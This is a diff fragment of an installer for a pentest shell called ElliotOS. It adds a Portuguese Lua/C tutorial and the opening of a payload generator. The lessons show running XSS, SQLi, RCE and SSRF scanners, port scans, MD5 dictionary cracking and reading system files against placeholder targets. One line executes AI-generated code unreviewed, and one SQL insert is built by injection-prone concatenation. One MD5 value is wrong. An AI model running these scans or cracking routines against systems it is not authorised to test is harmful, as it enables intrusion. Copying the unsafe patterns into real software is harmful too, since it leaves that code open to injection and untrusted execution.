+    sec('Criando um módulo')
+    ok('-- arquivo: utils.lua')
+    ok('local M = {}')
+    ok('')
+    ok('function M.sha_check(hash)')
+    ok('  return #hash == 64  -- SHA256 tem 64 hex chars')
+    ok('end')
+    ok('')
+    ok('function M.trim(s)')
+    ok("  return s:match('^%s*(.-)%s*$')")
+    ok('end')
+    ok('')
+    ok('return M')
+    print()
+    sec('Usando o módulo')
+    ok("local utils = dofile('utils.lua')   -- carrega arquivo")
+    ok("print(utils.trim('  ola  '))        --> 'ola'")
+    print()
+    sec('No ElliotOS: nunca use require() para módulos do sistema')
+    ok("-- ERRADO:  local net = require('net')")
+    ok("-- CERTO:   net já está carregado automaticamente no ms")
+    cont()
+end
+
+local function l10()
+    cabecalho(10, 'TRILHA 1 — OOP com metatables')
+    sec('Orientação a objetos em Lua')
+    ok('local Scanner = {}')
+    ok('Scanner.__index = Scanner')
+    ok('')
+    ok('function Scanner.novo(host, porta)')
+    ok('  return setmetatable({host=host, porta=porta, resultados={}}, Scanner)')
+    ok('end')
+    ok('')
+    ok('function Scanner:adicionar(info)')
+    ok('  table.insert(self.resultados, info)')
+    ok('end')
+    ok('')
+    ok('function Scanner:resumo()')
+    ok("  print(self.host..':'..self.porta, #self.resultados..' achados')")
+    ok('end')
+    ok('')
+    ok("-- uso:")
+    ok("local s = Scanner.novo('192.168.1.1', 80)")
+    ok("s:adicionar('XSS encontrado')")
+    ok("s:resumo()   --> 192.168.1.1:80  1 achados")
+    cont()
+end
+
+local function l11()
+    cabecalho(11, 'TRILHA 1 — Erros e pcall')
+    sec('Tratamento de erros')
+    ok('-- error() lança um erro')
+    ok('local function dividir(a, b)')
+    ok("  if b == 0 then error('divisão por zero') end")
+    ok('  return a / b')
+    ok('end')
+    print()
+    ok('-- pcall captura o erro sem travar o programa')
+    ok('local ok, resultado = pcall(dividir, 10, 0)')
+    ok('if ok then')
+    ok('  print("resultado:", resultado)')
+    ok('else')
+    ok('  print("erro:", resultado)   --> erro: divisão por zero')
+    ok('end')
+    print()
+    sec('xpcall — com traceback')
+    ok('local ok, err = xpcall(funcao_perigosa, function(e)')
+    ok('  return debug.traceback(e, 2)')
+    ok('end)')
+    print()
+    sec('Em scripts de pentest: sempre use pcall em chamadas de rede')
+    ok("local ok, r = pcall(net.get, 'https://alvo.com')")
+    ok("if not ok then print('falhou:', r) end")
+    cont()
+end
+
+local function l12()
+    cabecalho(12, 'TRILHA 1 — Corrotinas (concorrência cooperativa)')
+    sec('O que são corrotinas')
+    ok('Corrotinas permitem pausar e retomar funções.')
+    ok('Úteis para scraping, pipelines e I/O múltiplo.')
+    print()
+    sec('Criando e rodando')
+    ok('local co = coroutine.create(function(a, b)')
+    ok('  print("inicio", a, b)')
+    ok('  local c = coroutine.yield(a + b)   -- pausa, retorna a+b')
+    ok('  print("continuou com", c)')
+    ok('end)')
+    ok('')
+    ok('local ok, v = coroutine.resume(co, 10, 20)')
+    ok('print("yield retornou:", v)         --> 30')
+    ok('coroutine.resume(co, "dado extra")  -- retoma')
+    print()
+    sec('coroutine.wrap — interface mais simples')
+    ok('local gen = coroutine.wrap(function()')
+    ok('  for i = 1, 3 do coroutine.yield(i) end')
+    ok('end)')
+    ok('print(gen(), gen(), gen())   --> 1  2  3')
+    cont()
+end
+
+-- ══════════════════════════════════════════════════
+-- TRILHA 2 — LUA + ELLIOTOS API
+-- ══════════════════════════════════════════════════
+
+local function l13()
+    cabecalho(13, 'TRILHA 2 — ElliotOS: o ms e os módulos')
+    print(C.cmd..'  Trilha 2: Lua + ElliotOS API'..C.reset..'\n')
+    sec('Como o ElliotOS funciona')
+    ok('O ms é o Lua 5.4 compilado com 23 módulos C embutidos.')
+    ok('Ao iniciar o REPL, todos os módulos já estão no ambiente global.')
+    ok('Você escreve Lua puro e acessa pentest, rede, crypto, IA, etc.')
+    print()
+    sec('Módulos disponíveis (sem require)')
+    ok('net.*      HTTP, TCP, UDP, DNS, port scan, sockets')
+    ok('mod.*      23 scanners de pentest (XSS, SQLi, LFI...)')
+    ok('crypto.*   MD5, SHA, AES, Base64, JWT, HMAC')
+    ok('sys.*      threads, processos, env, sleep, tempo')
+    ok('fs.*       read, write, list, stat, glob, chmod')
+    ok('ai.*       CYN: chat, code, search, providers')
+    ok('db.*       SQLite embutido')
+    ok('pent.*     utilitários de pentest extras')
+    ok('ui.*       interface no terminal')
+    ok('agent.*    agente autônomo com tools')
+    cont()
+end
+
+local function l14()
+    cabecalho(14, 'TRILHA 2 — net.*: HTTP e rede')
+    sec('HTTP GET e POST')
+    ok("local r = net.get('https://httpbin.org/get')")
+    ok("print(r.code)           --> 200")
+    ok("print(#r.body)          -- tamanho da resposta")
+    ok("print(r.headers['content-type'])")
+    ok('')
+    ok("local r2 = net.post('https://httpbin.org/post',")
+    ok("  'user=admin&pass=123',")
+    ok("  {headers={['Content-Type']='application/x-www-form-urlencoded'}})")
+    print()
+    sec('DNS, ping e port scan')
+    ok("net.dns('google.com')              -- tabela de IPs")
+    ok("net.ping('8.8.8.8')               -- ms ou nil")
+    ok("local portas = net.scan('192.168.1.1', 1, 1024)")
+    ok("for _, p in ipairs(portas) do print('aberta:', p) end")
+    print()
+    sec('Socket TCP')
+    ok("local s = net.tcp('192.168.1.1', 80)")
+    ok("s:send('GET / HTTP/1.0\\r\\nHost: alvo\\r\\n\\r\\n')")
+    ok("print(s:recv(4096))")
+    ok("s:close()")
+    cont()
+end
+
+local function l15()
+    cabecalho(15, 'TRILHA 2 — mod.*: scanners de pentest')
+    sec('Scanners básicos')
+    ok("mod.xss('http://alvo.com/?q=')        -- XSS reflected/stored")
+    ok("mod.sqli('http://alvo.com/?id=')       -- SQLi multi-técnica")
+    ok("mod.lfi('http://alvo.com/?file=')      -- LFI / path traversal")
+    ok("mod.rce('http://alvo.com/?cmd=')       -- RCE")
+    ok("mod.ssrf('http://alvo.com/?url=')      -- SSRF")
+    ok("mod.ssti('http://alvo.com/?tpl=')      -- template injection")
+    print()
+    sec('Análise de infraestrutura')
+    ok("mod.headers('https://alvo.com')        -- security headers")
+    ok("mod.waf('https://alvo.com')            -- detecta WAF")
+    ok("mod.cors('https://alvo.com')           -- CORS misconfig")
+    ok("mod.subdomains('alvo.com')             -- enumeração")
+    ok("mod.dirs('http://alvo.com')            -- bruteforce dirs")
+    ok("mod.secrets('http://alvo.com')         -- secrets expostos")
+    print()
+    sec('Pipeline completo')
+    ok("-- roda todos os scanners em sequência:")
+    ok("mod.chain('http://alvo.com')")
+    ok('')
+    ok("-- spider + scan:")
+    ok("local urls = mod.spider('http://alvo.com', 50)")
+    ok("for _, url in ipairs(urls) do")
+    ok("  mod.xss(url)")
+    ok("end")
+    cont()
+end
+
+local function l16()
+    cabecalho(16, 'TRILHA 2 — crypto.*: criptografia')
+    sec('Hashes')
+    ok("crypto.md5('senha')         --> 'd41d8cd98f00b204...'")
+    ok("crypto.sha1('senha')        --> hash SHA1")
+    ok("crypto.sha256('senha')      --> hash SHA256 (64 hex)")
+    ok("crypto.sha512('senha')      --> hash SHA512")
+    ok("crypto.hmac('chave','dado','sha256')  -- HMAC")
+    print()
+    sec('Encoding')
+    ok("crypto.b64e('ola mundo')    --> 'b2xhIG11bmRv'")
+    ok("crypto.b64d('b2xhIG11bmRv')-- 'ola mundo'")
+    print()
+    sec('AES e JWT')
+    ok("local enc = crypto.aes_enc('chave32bytes_____________', 'segredo')")
+    ok("local dec = crypto.aes_dec('chave32bytes_____________', enc)")
+    ok('')
+    ok("-- JWT: decodifica sem verificar assinatura")
+    ok("local t = crypto.jwt('eyJhbGc...')")
+    ok("print(t.header.alg)    -- algoritmo usado")
+    ok("print(t.payload.sub)   -- subject/usuário")
+    print()
+    sec('Uso em pentest')
+    ok("-- crack MD5 simples:")
+    ok("local palavras = {'admin','123456','senha','root'}")
+    ok("local alvo = 'd41d8cd98f00b204e9800998ecf8427e'")
+    ok("for _, p in ipairs(palavras) do")
+    ok("  if crypto.md5(p) == alvo then print('senha:', p) end")
+    ok("end")
+    cont()
+end
+
+local function l17()
+    cabecalho(17, 'TRILHA 2 — sys.* e fs.*: sistema e arquivos')
+    sec('sys.* — controle do sistema')
+    ok("sys.info()              -- CPU, RAM, arch, deps")
+    ok("sys.sleep(2)            -- pausa 2 segundos")
+    ok("sys.time()              -- epoch em segundos")
+    ok("sys.time_ms()           -- epoch em milissegundos")
+    ok("sys.env('HOME')         -- lê variável de ambiente")
+    ok("sys.env('MYVAR','abc')  -- seta variável")
+    ok("sys.pid()               -- PID do processo")
+    ok("sys.sh('ls -la')        -- executa shell")
+    print()
+    sec('Threads em Lua (sys.thread)')
+    ok("local t1 = sys.thread(function()")
+    ok("  net.scan('192.168.1.1', 1, 512)")
+    ok("end)")
+    ok("local t2 = sys.thread(function()")
+    ok("  net.scan('192.168.1.1', 513, 1024)")
+    ok("end)")
+    ok("sys.join(t1); sys.join(t2)")
+    print()
+    sec('fs.* — arquivos')
+    ok("fs.read('/etc/hosts')              -- string com conteúdo")
+    ok("fs.write('log.txt', 'linha\\n')     -- cria/sobrescreve")
+    ok("fs.append('log.txt', 'mais\\n')     -- adiciona")
+    ok("fs.list('/home')                   -- tabela de nomes")
+    ok("fs.stat('/etc/passwd')             -- {size, mtime, ...}")
+    ok("fs.isfile('/etc/passwd')           -- true/false")
+    ok("fs.mkdir('/tmp/scan_out')          -- cria dir")
+    ok("fs.glob('/tmp/*.txt')              -- lista por padrão")
+    cont()
+end
+
+local function l18()
+    cabecalho(18, 'TRILHA 2 — ai.*: CYN inteligência artificial')
+    sec('Chat e perguntas')
+    ok("ai.ask('o que é SQLi?')           -- resposta direta")
+    ok("ai.chat('explique SSRF')          -- com histórico")
+    ok("ai.clear()                        -- limpa histórico")
+    print()
+    sec('Geração de código')
+    ok("local cod = ai.code('escreva um port scanner em Lua')")
+    ok("print(cod)")
+    ok("-- ou execute direto:")
+    ok("load(ai.code('função que faz ping em tabela de IPs'))()")
+    print()
+    sec('Providers')
+    ok("ai.provider('sky')                -- gratuito, sem key")
+    ok("ai.provider('pollinations')       -- gratuito")
+    ok("ai.provider('groq','llama-3.3-70b-versatile')  -- key")
+    ok("ai.provider('openai','gpt-4o')   -- key")
+    ok("ai.provider('gemini')             -- key Google")
+    ok("ai.key('SUA_KEY_AQUI')            -- configura key")
+    print()
+    sec('Uso em pentest assistido')
+    ok("local headers = mod.headers('https://alvo.com')")
+    ok("local analise = ai.ask('analise esses headers: '..headers)")
+    ok("print(analise)")
+    cont()
+end
+
+local function l19()
+    cabecalho(19, 'TRILHA 2 — db.*: banco de dados SQLite')
+    sec('Abrindo e criando tabelas')
+    ok("local banco = db.open('scan.db')")
+    ok('')
+    ok('db:exec([[')
+    ok('  CREATE TABLE IF NOT EXISTS resultados (')
+    ok('    id    INTEGER PRIMARY KEY,')
+    ok('    host  TEXT,')
+    ok('    vuln  TEXT,')
+    ok("    data  TEXT")
+    ok('  )')
+    ok(']])')
+    print()
+    sec('Insert e query')
+    ok('db:exec(string.format(')
+    ok('  "INSERT INTO resultados VALUES(NULL,\'%s\',\'%s\',datetime(\'now\'))",')
+    ok("  'alvo.com', 'XSS'))")
+    ok('')
+    ok("local rows = db:query('SELECT * FROM resultados')")
+    ok("for _, row in ipairs(rows) do")
+    ok("  print(row.host, row.vuln, row.data)")
+    ok("end")
+    ok("db:close()")
+    print()
+    sec('Uso prático: salvar scans')
+    ok("local urls = mod.spider('http://alvo.com', 100)")
+    ok("for _, url in ipairs(urls) do")
+    ok("  local r = mod.xss(url)")
+    ok("  if r and r.vuln then")
+    ok("    db:exec(\"INSERT INTO resultados VALUES(NULL,'\"..url..\"','XSS',datetime('now'))\")")
+    ok("  end")
+    ok("end")
+    cont()
+end
+
+local function l20()
+    cabecalho(20, 'TRILHA 2 — Scripts profissionais com ElliotOS')
+    sec('Estrutura de um script completo')
+    ok('#!/usr/bin/env ms')
+    ok('-- recon.lua — reconhecimento básico')
+    ok('-- Uso: ms --script recon -- alvo.com')
+    ok('')
+    ok("local alvo = arg[1] or error('uso: recon -- <host>')")
+    ok("local db_scan = db.open('/tmp/recon_'..alvo..'.db')")
+    ok('')
+    ok("print('[*] Alvo: '..alvo)")
+    ok('')
+    ok('-- DNS')
+    ok('local ips = net.dns(alvo)')
+    ok("for _, ip in ipairs(ips) do print('[+] IP:', ip) end")
+    ok('')
+    ok('-- port scan em thread')
+    ok('local portas = {}')
+    ok('local t = sys.thread(function()')
+    ok('  portas = net.scan(ips[1], 1, 1024)')
+    ok('end)')
+    ok('')
+    ok('-- headers enquanto scanneia')
+    ok("local h = mod.headers('https://'..alvo)")
+    ok('sys.join(t)')
+    ok('')
+    ok("print('[+] Portas abertas:', #portas)")
+    ok("print('[+] Headers analisados')")
+    cont()
+end
+
+local function l21()
+    cabecalho(21, 'TRILHA 2 — lpm, xpm e scripts externos')
+    sec('lpm — gerenciador de módulos Lua')
+    ok('lpm install luasocket      # socket Lua puro')
+    ok('lpm install luajson        # JSON')
+    ok('lpm install --all          # instala lista curada')
+    ok('lpm list                   # módulos instalados')
+    ok("lpm --script -s 'sqli'     # busca exploit-db")
+    ok('lpm --script -i 42         # instala exploit #42')
+    print()
+    sec('xpm — ferramentas de pentest externas')
+    ok('xpm install nuclei         # scanner de templates')
+    ok('xpm install sqlmap         # SQLi automatizado')
+    ok('xpm install ffuf           # fuzzer HTTP')
+    ok('xpm install nmap           # port scan avançado')
+    ok('xpm search web             # busca ferramentas web')
+    ok('xpm list                   # instaladas')
+    print()
+    sec('Integrando xpm com Lua')
+    ok("local out = sys.sh('nuclei -u https://alvo.com -silent')")
+    ok("for linha in out:gmatch('[^\\n]+') do")
+    ok("  if linha:find('CRITICAL','HIGH') then")
+    ok("    print('[!]', linha)")
+    ok("  end")
+    ok("end")
+    cont()
+end
+
+-- ══════════════════════════════════════════════════
+-- TRILHA 3 — C NO ELLIOTOS
+-- ══════════════════════════════════════════════════
+
+local function l22()
+    cabecalho(22, 'TRILHA 3 — C: base e diferença para Lua')
+    print(C.cmd..'  Trilha 3: C no ElliotOS'..C.reset..'\n')
+    sec('Por que C no ElliotOS')
+    ok('O ElliotOS é escrito em C. Os 23 módulos do ms são C.')
+    ok('Scripts .c em ms --script compilam automaticamente via cxx.')
+    ok('C é necessário para: performance, sockets raw, syscalls,')
+    ok('módulos customizados e ferramentas de baixo nível.')
+    print()
+    sec('Diferenças principais C vs Lua')
+    ok('C: compilado, tipado, manual de memória, rápido')
+    ok('Lua: interpretado, dinâmico, garbage collected, flexível')
+    ok('')
+    ok('C usa:   int, char, float, double, struct, pointer')
+    ok('Lua usa: number, string, table, boolean, nil (automático)')
+    print()
+    sec('Primeiro programa C no ElliotOS')
+    ok('// ola.c')
+    ok('#include <stdio.h>')
+    ok('')
+    ok('int main(void) {')
+    ok('    printf("Olá, ElliotOS!\\n");')
+    ok('    return 0;')
+    ok('}')
+    ok('')
+    ok('-- Compilar e rodar:')
+    ok('cxx ola.c -o ola && ./ola')
+    ok('-- ou direto:')
+    ok('ms --script ola.c')
+    cont()
+end
+
+local function l23()
+    cabecalho(23, 'TRILHA 3 — C: tipos, variáveis, operadores')
+    sec('Tipos fundamentais')
+    ok('int     x = 42;          // inteiro (32-bit)')
+    ok('long    y = 123456789L;  // inteiro longo (64-bit)')
+    ok('float   f = 3.14f;       // decimal simples')
+    ok('double  d = 3.14159;     // decimal duplo')
+    ok("char    c = 'A';         // caractere / byte")
+    ok('char   *s = "texto";     // ponteiro para string')
+    ok('int     arr[5] = {1,2,3,4,5};  // array')
+    print()
+    sec('Tipos de tamanho garantido (prefira em pentest)')
+    ok('#include <stdint.h>')
+    ok('uint8_t   b = 0xFF;      // 1 byte unsigned')
+    ok('uint16_t  p = 443;       // 2 bytes (porta)')
+    ok('uint32_t  ip = 0xC0A801; // 4 bytes (IPv4)')
+    ok('int64_t   ts;            // timestamp')
+    print()
+    sec('Operadores bitwise (essencial em redes/crypto)')
+    ok('x & y   -- AND bit a bit')
+    ok('x | y   -- OR bit a bit')
+    ok('x ^ y   -- XOR (muito usado em criptografia)')
+    ok('~x      -- NOT / complemento')
+    ok('x << n  -- shift esquerda (multiplica por 2^n)')
+    ok('x >> n  -- shift direita  (divide por 2^n)')
+    ok('')
+    ok('// máscara de sub-rede:')
+    ok('uint32_t mask = 0xFFFFFF00;  // /24')
+    ok('uint32_t net  = ip & mask;')
+    cont()
+end
+
+local function l24()
+    cabecalho(24, 'TRILHA 3 — C: if, loops, funções')
+    sec('Condicional')
+    ok('int porta = 443;')
+    ok('if (porta == 80) {')
+    ok('    printf("HTTP\\n");')
+    ok('} else if (porta == 443) {')
+    ok('    printf("HTTPS\\n");   // cai aqui')
+    ok('} else {')
+    ok('    printf("outra\\n");')
+    ok('}')
+    print()
+    sec('Loops')
+    ok('for (int i = 0; i < 10; i++) { printf("%d\\n", i); }')
+    ok('')
+    ok('int n = 0;')
+    ok('while (n < 5) { n++; }')
+    ok('')
+    ok('do { n--; } while (n > 0);')
+    print()
+    sec('Funções')
+    ok('// declaração (protótipo)')
+    ok('int soma(int a, int b);')
+    ok('')
+    ok('// definição')
+    ok('int soma(int a, int b) {')
+    ok('    return a + b;')
+    ok('}')
+    ok('')
+    ok('// ponteiro de função (callbacks)')
+    ok('int (*fn)(int, int) = soma;')
+    ok('printf("%d\\n", fn(3, 4));   // 7')
+    cont()
+end
+
+local function l25()
+    cabecalho(25, 'TRILHA 3 — C: ponteiros e memória')
+    sec('Ponteiros — o coração do C')
+    ok('int x = 42;')
+    ok('int *p = &x;     // p aponta para x')
+    ok('printf("%d\\n", *p);    // desreferencia: 42')
+    ok('*p = 99;          // muda x via ponteiro')
+    ok('printf("%d\\n", x);     // 99')
+    print()
+    sec('Alocação dinâmica')
+    ok('#include <stdlib.h>')
+    ok('')
+    ok('char *buf = malloc(1024);       // aloca 1KB')
+    ok('if (!buf) { perror("malloc"); exit(1); }')
+    ok('')
+    ok('snprintf(buf, 1024, "payload=%s", input);')
+    ok('// usa buf...')
+    ok('free(buf);                      // SEMPRE libere')
+    print()
+    sec('Strings em C (arrays de char terminados em 0)')
+    ok('#include <string.h>')
+    ok('char dst[256];')
+    ok('strncpy(dst, src, sizeof(dst)-1);  // copia segura')
+    ok('strncat(dst, " sufixo", sizeof(dst)-strlen(dst)-1);')
+    ok('strlen(s)          -- comprimento')
+    ok('strcmp(a, b)       -- compara (0 = igual)')
+    ok('strstr(hay, needle)-- busca substring')
+    ok('')
+    ok('// NUNCA use strcpy/strcat sem limite — buffer overflow!')
+    cont()
+end
+
+local function l26()
+    cabecalho(26, 'TRILHA 3 — C: sockets e rede raw')
+    sec('Socket TCP em C (como o ms faz internamente)')
+    ok('#include <stdio.h>')
+    ok('#include <string.h>')
+    ok('#include <sys/socket.h>')
+    ok('#include <netinet/in.h>')
+    ok('#include <arpa/inet.h>')
+    ok('#include <unistd.h>')
+    ok('')
+    ok('int fd = socket(AF_INET, SOCK_STREAM, 0);')
+    ok('struct sockaddr_in addr = {')
+    ok('    .sin_family = AF_INET,')
+    ok('    .sin_port   = htons(80),')
+    ok('};')
+    ok('inet_pton(AF_INET, "192.168.1.1", &addr.sin_addr);')
+    ok('')
+    ok('if (connect(fd, (struct sockaddr*)&addr, sizeof(addr)) == 0) {')
+    ok('    char req[] = "GET / HTTP/1.0\\r\\n\\r\\n";')
+    ok('    send(fd, req, strlen(req), 0);')
+    ok('    char buf[4096];')
+    ok('    int n = recv(fd, buf, sizeof(buf)-1, 0);')
+    ok('    buf[n] = 0;')
+    ok('    puts(buf);')
+    ok('}')
+    ok('close(fd);')
+    cont()
+end
+
+local function l27()
+    cabecalho(27, 'TRILHA 3 — C: criar módulo para o ms')
+    sec('Módulo C que o ms pode carregar')
+    ok('// meu_mod.c — módulo Lua escrito em C')
+    ok('#include <lua.h>')
+    ok('#include <lauxlib.h>')
+    ok('')
+    ok('// função Lua: meu.xor(str, key)')
+    ok('static int l_xor(lua_State *L) {')
+    ok('    size_t slen, klen;')
+    ok('    const char *s = luaL_checklstring(L, 1, &slen);')
+    ok('    const char *k = luaL_checklstring(L, 2, &klen);')
+    ok('    char *out = malloc(slen+1);')
+    ok('    for (size_t i = 0; i < slen; i++)')
+    ok('        out[i] = s[i] ^ k[i % klen];')
+    ok('    out[slen] = 0;')
+    ok('    lua_pushlstring(L, out, slen);')
+    ok('    free(out);')
+    ok('    return 1;  // 1 valor retornado')
+    ok('}')
+    ok('')
+    ok('int luaopen_meu_mod(lua_State *L) {')
+    ok('    luaL_Reg funcs[] = {{"xor", l_xor}, {NULL,NULL}};')
+    ok('    luaL_newlib(L, funcs);')
+    ok('    return 1;')
+    ok('}')
+    ok('')
+    ok('-- compilar:')
+    ok('cxx -shared -fPIC meu_mod.c -o meu_mod.so $(pkg-config --cflags lua5.4)')
+    ok("-- usar no ms:")
+    ok("local meu = require('meu_mod')")
+    ok("print(meu.xor('segredo', 'k'))")
+    cont()
+end
+
+-- ══════════════════════════════════════════════════
+-- TRILHA 4 — PROJETOS REAIS
+-- ══════════════════════════════════════════════════
+
+local function l28()
+    cabecalho(28, 'TRILHA 4 — Projeto: scanner de vulnerabilidades')
+    print(C.cmd..'  Trilha 4: Projetos reais de pentest'..C.reset..'\n')
+    sec('vuln_scan.lua — scanner completo com relatório')
+    ok('-- Uso: ms --script vuln_scan -- http://alvo.com')
+    ok("local alvo  = arg[1] or error('informe a URL')")
+    ok("local relat = 'relatorio_'..os.date('%Y%m%d_%H%M')..'.txt'")
+    ok('local vulns = 0')
+    ok('')
+    ok('local function log(msg)')
+    ok('  print(msg)')
+    ok("  fs.append(relat, msg..'\\n')")
+    ok('end')
+    ok('')
+    ok("log('[*] Iniciando scan: '..alvo)")
+    ok("log('[*] '..os.date())")
+    ok('')
+    ok('local checks = {')
+    ok("  {'XSS',    function() return mod.xss(alvo)  end},")
+    ok("  {'SQLi',   function() return mod.sqli(alvo) end},")
+    ok("  {'LFI',    function() return mod.lfi(alvo)  end},")
+    ok("  {'Headers',function() return mod.headers(alvo) end},")
+    ok('}')
+    ok('')
+    ok('for _, ck in ipairs(checks) do')
+    ok('  local ok, r = pcall(ck[2])')
+    ok('  if ok and r and r.vuln then')
+    ok("    log('[!] '..ck[1]..': VULNERÁVEL')")
+    ok('    vulns = vulns + 1')
+    ok('  end')
+    ok('end')
+    ok('')
+    ok("log('\\n[=] Total: '..vulns..' vulnerabilidades')")
+    ok("log('[=] Relatório: '..relat)")
+    cont()
+end
+
+local function l29()
+    cabecalho(29, 'TRILHA 4 — Projeto: port scanner multi-thread')
+    sec('portscan_mt.lua — scan paralelo com threads')
+    ok("-- Uso: ms --script portscan_mt -- 192.168.1.1 1 9999")
+    ok("local host  = arg[1] or '127.0.0.1'")
+    ok("local p_ini = tonumber(arg[2]) or 1")
+    ok("local p_fim = tonumber(arg[3]) or 1024")
+    ok("local THREADS = 4")
+    ok('')
+    ok("local abertas = {}")
+    ok("local chunk = math.floor((p_fim - p_ini + 1) / THREADS)")
+    ok('')
+    ok("print(string.format('[*] Scan %s:%d-%d (%d threads)', host, p_ini, p_fim, THREADS))")
+    ok('')
+    ok("local ts = {}")
+    ok("for i = 1, THREADS do")
+    ok("  local ini = p_ini + (i-1) * chunk")
+    ok("  local fim = (i == THREADS) and p_fim or (ini + chunk - 1)")
+    ok("  ts[i] = sys.thread(function()")
+    ok("    local r = net.scan(host, ini, fim)")
+    ok("    for _, p in ipairs(r) do")
+    ok("      table.insert(abertas, p)")
+    ok("    end")
+    ok("  end)")
+    ok("end")
+    ok('')
+    ok("for _, t in ipairs(ts) do sys.join(t) end")
+    ok("table.sort(abertas)")
+    ok('')
+    ok("print('[+] Portas abertas ('..#abertas..'):')")
+    ok("for _, p in ipairs(abertas) do")
+    ok("  print(string.format('  %-6d  %s', p, net.banner(host,p) or ''))")
+    ok("end")
+    cont()
+end
+
+local function l30()
+    cabecalho(30, 'TRILHA 4 — Próximos passos e recursos')
+    sec('Você concluiu o tutorial completo!')
+    ok('Trilha 1: Lua básico ao avançado      [COMPLETO]')
+    ok('Trilha 2: Lua + ElliotOS API          [COMPLETO]')
+    ok('Trilha 3: C no ElliotOS               [COMPLETO]')
+    ok('Trilha 4: Projetos reais              [COMPLETO]')
+    print()
+    sec('Próximos passos')
+    ok('ms --examples        # scripts prontos para estudar')
+    ok('ms --doc modulos     # referência completa da API')
+    ok('ms --doc net         # módulo net.*')
+    ok('ms --doc mod         # scanners mod.*')
+    ok('ms --doc crypto      # crypto.*')
+    ok("lpm --script -s ''   # explore o exploit-db")
+    ok('xpm list             # ferramentas disponíveis')
+    print()
+    sec('Recursos externos')
+    ok('lua.org/manual/5.4                     -- manual oficial Lua 5.4')
+    ok('github.com/mikeelliot218/ElliotOS      -- código fonte')
+    ok("ms -a 'dúvida'                         -- pergunte para a CYN")
+    print()
+    print(C.ok..'  Bom pentest. Use com responsabilidade.'..C.reset..'\n')
+end
+
+-- ── Tabela de lições ──────────────────────────────────────────
+local licoes = {
+    l01, l02, l03, l04, l05, l06, l07, l08, l09, l10,
+    l11, l12, l13, l14, l15, l16, l17, l18, l19, l20,
+    l21, l22, l23, l24, l25, l26, l27, l28, l29, l30,
+}
+
+-- ── Main ──────────────────────────────────────────────────────
+local inicio = menu_trilhas()
+local i = inicio
+while i <= TOTAL do
+    licoes[i]()
+    i = i + 1
+end
+LEARNEOF
+    chmod 644 "$_EX_DIR/learn.lua"
+    _ok "learn.lua instalado em $_EX_DIR/learn.lua"
+
+    # ── payload.lua — gerador de payloads ────────────────────────────────
+    cat > "$_EX_DIR/payload.lua" << 'PAYLOADINSTEOF'
+-- payload.lua — ElliotOS Payload Generator
+-- ms --payload  ou  ms payload.lua
+
+local C = {
+    ok    = '\027[1;32m',
+    err   = '\027[1;31m',
+    info  = '\027[1;36m',
+    cmd   = '\027[1;33m',
+    dim   = '\027[0;90m',
+    bold  = '\027[1m',
+    reset = '\027[0m',
+    mag   = '\027[1;35m',
+}
+
+local function clear() io.write('\027[2J\027[H') end
+local function P(c, s) io.write(c..s..C.reset..'\n') end
+local function ask(prompt, default)
+    io.write(C.cmd..prompt..C.reset)
+    if default then io.write(C.dim..' ['..default..']'..C.reset) end
+    io.write(': ')
+    local r = io.read('*l')
+    if not r or r:match('^%s*$') then return default end
+    return r:match('^%s*(.-)%s*$')
+end
+local function choose(prompt, opts, default)
+    P(C.info, '\n  '..prompt)
+    for i, v in ipairs(opts) do
+        local mark = (v == default) and C.ok..' *' or C.dim..'  '
+        io.write(mark..' '..i..'. '..v..C.reset..'\n')
     end
-    io.write(C.bold.."\n  Escolha: "..C.reset)
-    return io.read("*l")
+    io.write(C.cmd..'  Escolha'..C.reset..C.dim..' [1-'..#opts..']'..C.reset..': ')
+    local r = io.read('*l')
+    local n = tonumber(r)
+    if n and opts[n] then return opts[n] end
+    return default
 end
 
--- ── SEÇÃO 1: Lua Básico ───────────────────────────────────────
-local function lua_basico()
-    titulo("1. Lua Básico")
-    info("Lua é a linguagem do ElliotOS. Simples, rápida, poderosa.")
-
-    secao("Variáveis")
-    ex("tipos básicos",
-        'local nome = "ElliotOS"\n'..
-        'local versao = 17\n'..
-        'local ativo = true\n'..
-        'print(nome, versao, ativo)')
-
-    secao("Strings")
-    ex("concatenar strings com ..",
-        'local a = "Olá"\n'..
-        'local b = "mundo"\n'..
-        'print(a .. " " .. b)  --> Olá mundo')
-    ex("formatar com string.format",
-        'print(string.format("IP: %s | Porta: %d", "192.168.1.1", 80))')
-    ex("buscar padrão em string",
-        'local ip = "alvo: 192.168.1.1"\n'..
-        'local found = ip:match("%d+%.%d+%.%d+%.%d+")\n'..
-        'print(found)  --> 192.168.1.1')
-
-    secao("Tabelas (listas e dicionários)")
-    ex("lista",
-        'local portas = {80, 443, 22, 3306}\n'..
-        'for i, p in ipairs(portas) do\n'..
-        '    print(i, p)\n'..
-        'end')
-    ex("dicionário",
-        'local alvo = {ip="192.168.1.1", porta=80, aberta=true}\n'..
-        'print(alvo.ip, alvo.porta)')
-
-    secao("Funções")
-    ex("função simples",
-        'local function somar(a, b)\n'..
-        '    return a + b\n'..
-        'end\n'..
-        'print(somar(3, 4))  --> 7')
-    ex("múltiplos retornos",
-        'local function info(ip)\n'..
-        '    return ip, 80, "http"\n'..
-        'end\n'..
-        'local ip, porta, proto = info("1.1.1.1")\n'..
-        'print(ip, porta, proto)')
-
-    secao("Condicionais e loops")
-    ex("if/elseif/else",
-        'local porta = 443\n'..
-        'if porta == 80 then print("HTTP")\n'..
-        'elseif porta == 443 then print("HTTPS")\n'..
-        'else print("Outra porta") end')
-    ex("loop for numérico",
-        'for i = 1, 5 do\n'..
-        '    io.write(i .. " ")\n'..
-        'end')
-    ex("loop while",
-        'local i = 0\n'..
-        'while i < 3 do\n'..
-        '    print("tentativa " .. i)\n'..
-        '    i = i + 1\n'..
-        'end')
-
-    secao("Tratamento de erros")
-    ex("pcall — protege contra erros",
-        'local ok, err = pcall(function()\n'..
-        '    error("algo falhou")\n'..
-        'end)\n'..
-        'if not ok then print("Erro:", err) end')
-
-    if pausar() then return end
-end
-
--- ── SEÇÃO 2: Módulo net ───────────────────────────────────────
-local function modulo_net()
-    titulo("2. Módulo net — Rede")
-    info("net é o coração do ElliotOS. HTTP, TCP, UDP, DNS, sockets.")
-
-    secao("HTTP GET")
-    ex("requisição simples",
-        'local body, code = net.get("http://httpbin.org/ip")\n'..
-        'print("HTTP", code)\n'..
-        'print(body)')
-    ex("com timeout e sem output",
-        'local body, code = net.get("http://exemplo.com", {timeout=3, quiet=true})\n'..
-        'if body then print("ok:", code) else print("falhou") end')
-    ex("com headers customizados",
-        'local body = net.get("http://api.site.com/data", {\n'..
-        '    timeout = 5,\n'..
